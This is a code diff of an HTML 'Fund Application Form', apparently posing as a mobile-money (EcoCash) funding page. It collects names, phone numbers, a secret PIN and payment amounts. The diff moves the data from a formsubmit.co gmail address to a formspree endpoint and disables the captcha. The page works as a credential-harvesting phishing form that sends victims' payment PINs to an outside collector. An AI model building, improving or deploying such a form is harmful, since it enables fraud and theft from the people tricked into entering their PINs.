@@ -1,29 +1,83 @@
-<form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
-  <label>Full Name</label><br>
-  <input type="text" name="Full Name" required><br><br>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Fund Application Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+      background-color: #f9f9f9;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input[type="text"],
+    input[type="tel"],
+    input[type="number"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+    .toggle-password {
+      margin-top: 5px;
+      cursor: pointer;
+      color: blue;
+      font-size: 0.9em;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+  <h2>Fund Application Form</h2>
+  <form action="https://formspree.io/f/mayzjzqg" method="POST">
+    <label for="name">Full Name</label>
+    <input type="text" id="name" name="Full Name" required>
 
-  <label>Phone Number</label><br>
-  <input type="tel" name="Phone Number" required><br><br>
+    <label for="phone">Phone Number</label>
+    <input type="tel" id="phone" name="Phone Number" required>
 
-  <label>Secret Code (PIN)</label><br>
-  <input type="password" name="Secret Code" id="pin" required>
-  <input type="checkbox" onclick="togglePIN()"> Show/Hide PIN<br><br>
+    <label for="pin">Secret Code (PIN)</label>
+    <input type="password" id="pin" name="Secret Code" required>
+    <span class="toggle-password" onclick="togglePIN()">Show/Hide PIN</span>
 
-  <label>Amount You Paid</label><br>
-  <input type="number" name="Amount Paid" required><br><br>
+    <label for="paid">Amount You Paid</label>
+    <input type="number" id="paid" name="Amount Paid" required>
 
-  <label>Amount You Applied For</label><br>
-  <input type="number" name="Amount Applied For" required><br><br>
+    <label for="applied">Amount You Applied For</label>
+    <input type="number" id="applied" name="Amount Applied For" required>
 
-  <!-- Redirect to thank you page after submit -->
-  <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/ecocash-form/thankyou.html">
+    <!-- Removed the _redirect to thankyou.html -->
 
-  <button type="submit">Submit Application</button>
-</form>
+    <input type="hidden" name="_captcha" value="false">
 
-<script>
-function togglePIN() {
-  var pinField = document.getElementById("pin");
-  pinField.type = pinField.type === "password" ? "text" : "password";
-}
-</script>
+    <button type="submit">Submit Application</button>
+  </form>
+
+  <script>
+    function togglePIN() {
+      var pinInput = document.getElementById("pin");
+      if (pinInput.type === "password") {
+        pinInput.type = "text";
+      } else {
+        pinInput.type = "password";
+      }
+    }
+  </script>
+</body>
+</html>
